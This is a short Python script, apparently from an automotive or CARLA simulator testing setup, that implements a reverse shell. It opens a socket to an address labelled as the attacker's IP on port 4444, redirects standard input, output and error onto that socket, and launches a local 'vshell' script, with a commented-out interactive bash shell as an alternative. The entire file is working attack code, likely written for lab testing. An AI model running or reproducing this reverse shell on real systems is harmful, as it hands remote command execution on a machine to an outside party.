import socket
import subprocess
import os

def reverse_shell():
    attacker_ip = '192.168.56.1'  # Replace with the attacker's IP
    attacker_port = 4444

    # Establish a connection to the attacker
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))

    # Redirect stdin, stdout, and stderr to the socket
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    # Provide a shell to the attacker
    subprocess.call(["python", "/home/vel/Carla/PythonAPI/testcode/uds/hu_vshell.py"])
    #subprocess.call(["/bin/bash", "-i"])

reverse_shell()
